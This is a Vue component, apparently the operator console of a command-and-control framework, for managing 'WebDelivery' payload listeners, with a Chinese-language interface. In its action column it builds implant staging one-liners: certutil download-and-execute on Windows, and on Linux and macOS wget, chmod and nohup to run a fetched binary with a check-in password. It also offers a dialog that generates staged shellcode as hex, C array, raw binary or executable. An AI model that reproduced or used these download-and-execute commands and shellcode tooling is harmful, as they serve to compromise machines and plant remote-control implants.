<template>
  <div>
    <el-button type="primary" size="default" @click="dialogVisible = true">
      新增 WebDelivery
    </el-button>
    <br>
    <br>
    <el-table :data="tableData">
      <el-table-column prop="ListenerConfig" label="Listener"/>
      <el-table-column prop="OS" label="操作系统" width="150"/>
      <el-table-column prop="Arch" label="架构" width="150"/>
      <el-table-column prop="Pass" label="上线密码" width="150"/>
      <el-table-column prop="ListeningPort" label="监听端口" width="150"/>
      <el-table-column label="状态" prop="Status" width="150">
        <template #default="{ row }">
          <el-tag :type="row.Status === 1 ? 'success' : 'danger'" size="default">
            {{ row.Status === 1 ? '开启' : '关闭' }}
          </el-tag>
        </template>
      </el-table-column>
      <el-table-column label="操作">
        <template #default="scope">
          <el-popover
              placement="top"
              :width="500"
              trigger="click"
              :content="scope.row.OS === 'windows' ? `certutil -urlcache -split -f ${scope.row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${scope.row.Pass}`:`wget -P /tmp ${scope.row.ServerAddress}; chmod +x /tmp/${scope.row.FileName}; nohup /tmp/${scope.row.FileName} ${scope.row.Pass} > m.log 2>&1 &`"
          >
            <template #reference>
              <el-button size="small" v-if="scope.row.Status === 1" type="success">上线命令</el-button>
            </template>
          </el-popover>
          <el-button size="small" type="warning" v-if="scope.row.OS==='windows' && scope.row.Status === 1" @click="openDialog(scope.row)">shellcode生成</el-button>
          <el-button size="small" v-if="scope.row.Status === 2" type="success" @click="handleOpen(scope.row)">开启</el-button>
          <el-button size="small" v-if="scope.row.Status === 1" type="primary" @click="handleClose(scope.row)">关闭</el-button>
          <el-button size="small" type="danger" @click="handleDelete(scope.row)">删除</el-button>
        </template>
      </el-table-column>
      <!--    <el-table-column label="上线命令">-->
      <!--      <template #default="scope">-->

      <!--      </template>-->
      <!--    </el-table-column>-->
    </el-table>

    <el-dialog v-model="dialogVisible" title="配置WebDelivery">
      <el-card class="box-card">
        <div class="form-container">
          <!-- 操作系统选择 -->
          <el-form :model="formData" label-width="120px">

            <el-form-item label="Listener">
              <el-select v-model="formData.listener" placeholder="选择listener" @visible-change="handleDropdown">
                <el-option v-for="item in options" :key="item" :label="item" :value="item" />
              </el-select>
            </el-form-item>

            <el-form-item label="操作系统">
              <el-select v-model="formData.os" placeholder="选择操作系统" @change="handleOSChange">
                <el-option v-for="os in osOptions" :key="os.value" :label="os.label" :value="os.value" />
              </el-select>
            </el-form-item>

            <!-- 架构选择 -->
            <el-form-item label="架构">
              <el-select v-model="formData.arch" placeholder="选择架构" :disabled="archOptions.length === 0">
                <el-option v-for="arch in archOptions" :key="arch" :label="arch" :value="arch" />
              </el-select>
            </el-form-item>
            <el-form-item label="上线密码">
              <el-input v-model="formData.pass" style="width: 220px;" placeholder="输入上线密码"></el-input>
            </el-form-item>

            <el-form-item label="监听端口">
              <el-input v-model="formData.port" :style="{ width: '200px' }" placeholder="输入监听端口">
              </el-input>
            </el-form-item>

            <el-form-item label="文件名称">
              <el-input v-model="formData.filename" :style="{ width: '200px' }" placeholder="输入挂载的文件名称">
              </el-input>
            </el-form-item>
          </el-form>

          <!-- 生成按钮 -->
          <el-button type="primary" @click="handleWebDelivery" :disabled="!formData.os || !formData.arch">
            确定
          </el-button>
        </div>
      </el-card>
    </el-dialog>


    <el-dialog v-model="dialogVisible2" title="StageShellcode">
      <el-card class="box-card">
        <div class="form-container">
          <!-- 操作系统选择 -->
          <el-form v-model="selectedFormat" label-width="120px">
            <el-form-item label="输出格式">
              <el-select v-model="selectedFormat.format" placeholder="选择输出格式">
                <el-option label="十六进制 (hex)" value="hex" />
                <el-option label="C 数组 (C)" value="c" />
                <el-option label="二进制 (bin)" value="bin" />
                <el-option label="分阶段可执行程序 (exe)" value="exe" />
              </el-select>
            </el-form-item>
          </el-form>

          <!-- 生成按钮 -->
          <el-button type="primary" @click="handleStageShellcode">
            确定
          </el-button>
        </div>
      </el-card>
    </el-dialog>
  </div>



</template>

<script setup lang="ts">
import {ref,reactive,onMounted} from "vue"
import {ElMessage} from "element-plus"

const tableData = ref([]);
const dialogVisible = ref(false);
import ClientAPI from "@/api/clients";

const options = ref([]);

const handleDropdown = async()=>{
  const res = await ClientAPI.ShowListener()
  if (res.status ===200){
    if (res.data.status ===200){
      options.value = res.data.data
    }else{
      ElMessage.error(res.data.data)
    }
  }else{
    ElMessage.error("Something wrong")
  }
}

const osOptions = [
  { label: 'windows', value: 'windows' },
  { label: 'linux', value: 'linux' },
  { label: 'darwin', value: 'darwin' }
];

const archMapping: Record<string, string[]> = {
  windows: ['amd64', '386'],
  linux: ['amd64', '386', 'arm', 'arm64','loong64','mips','mipsle','mips64','mips64le'],
  darwin: ['amd64', 'arm64']
};
const selectedFormat = reactive({
  format: ''
})
// 表单数据
const formData = reactive({
  port:'',
  listener:'',
  os: '',
  arch: '',
  filename:'',
  pass:''
});

// 架构选项
const archOptions = reactive<string[]>([]);

// 处理操作系统切换
const handleOSChange = (os: string) => {
  formData.arch = ''; // 清空架构选择
  archOptions.splice(0, archOptions.length, ...(archMapping[os] || []));
};
const lis = ref("");
const port = ref("");
const openDialog = (row:any)=>{
  dialogVisible2.value=true;
  lis.value = row.ListenerConfig
  port.value = row.ListeningPort;
}
const getWebDeliveryList = async()=>{
  const res = await ClientAPI.GetWebDeliveryList();
  if (res.status ===200){
    if(res.data.status ===200){
      tableData.value = res.data.data
    }else{
      ElMessage.error(res.data.data)
    }

  }else{
    ElMessage.error("Something wrong")
  }
}
const handleWebDelivery = async()=>{
  const res = await ClientAPI.StartWebDelivery({listener:formData.listener,os:formData.os,arch:formData.arch,port:formData.port,filename:formData.filename,pass:formData.pass})
  if (res.status ===200){
    if(res.data.status ===200){
      ElMessage.success("添加成功")
      await getWebDeliveryList();
    }else{
      ElMessage.error(res.data.data)
    }

  }else{
    ElMessage.error("Something wrong")
  }
  dialogVisible.value=false
}

const handleClose = async(row :any)=>{
  const res = await ClientAPI.CloseWebDelivery({port:row.ListeningPort})
  if (res.status ===200){
    if(res.data.status === 200){
      ElMessage.success("关闭成功")
      await getWebDeliveryList();
    }else{
    await getWebDeliveryList();
    ElMessage.error(res.data.data)
  }
  }
}
const handleOpen = async(row :any)=>{
  const res = await ClientAPI.OpenWebDelivery({port:row.ListeningPort})
  if (res.status ===200){
    if(res.data.status === 200){
      ElMessage.success("开启成功")
      await getWebDeliveryList();
    }else{
      await getWebDeliveryList();
      ElMessage.error(res.data.data)
    }
  }
}
const handleDelete = async(row :any)=>{
  const res = await ClientAPI.DeleteWebDelivery({port:row.ListeningPort})
  if (res.status ===200){
    if(res.data.status === 200){
      ElMessage.success("删除成功")
      await getWebDeliveryList();
    }else{
      await getWebDeliveryList();
      ElMessage.error(res.data.data)
    }
  }
}


onMounted(async()=>{
  await getWebDeliveryList();
})



const dialogVisible2 = ref(false);
const handleStageShellcode = async()=>{
  const res = await ClientAPI.StageShellCodeGen({listener:lis.value,port:port.value,format:selectedFormat.format});
  if (res.status ===200){
    ElMessage.success('下载成功')
    const contentDisposition = res.headers['content-disposition'] || ''
    const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition)
    let fileName =
        matches && matches.length > 1
            ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
            : 'exported_file'
    let blob = new Blob([res.data], { type: res.headers['content-type'] })
    let downloadElement = document.createElement('a')
    let href = window.URL.createObjectURL(blob) // Create download link
    downloadElement.href = href
    downloadElement.download = fileName // Set the download file name
    document.body.appendChild(downloadElement)
    downloadElement.click() // Trigger download
    document.body.removeChild(downloadElement) // Remove element after download
    window.URL.revokeObjectURL(href) // Release blob object

  }else{
    ElMessage.error("Something wrong")
  }
  dialogVisible.value=false
}

</script>

<style scoped>
.box-card {
  max-width: 500px;
  margin: 20px auto;
  padding: 20px;
}

.form-container {
  display: flex;
  flex-direction: column;
  gap: 20px;
}
</style>